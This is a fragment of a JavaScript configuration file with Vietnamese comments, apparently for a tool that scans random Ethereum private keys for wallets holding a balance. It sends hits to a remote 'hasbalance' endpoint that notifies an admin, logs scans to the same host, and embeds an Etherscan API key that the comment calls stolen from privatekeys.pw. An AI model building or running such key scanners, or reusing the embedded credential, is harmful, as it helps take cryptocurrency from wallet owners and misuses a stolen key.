module.exports = {
    ...
    requestBalance: 'https://cloud.echbay.com/scan/eth/hasbalance', // gửi email cho admin
    //requestBalance: '', // không gửi email cho admin

    // URL lưu log việc scan -> dùng để thống kê là chủ yếu
    requestLog: 'https://cloud.echbay.com/scan/eth/log',
    ...
    // API key lấy trộm của https://privatekeys.pw/keys/ethereum/random
    addressAPI: 'https://api.etherscan.io/api?module=account&action=balancemulti&tag=latest&apikey=4Q5U7HNF4CGTVTGEMGRV5ZU9WYNJ6N7YA5&address=',
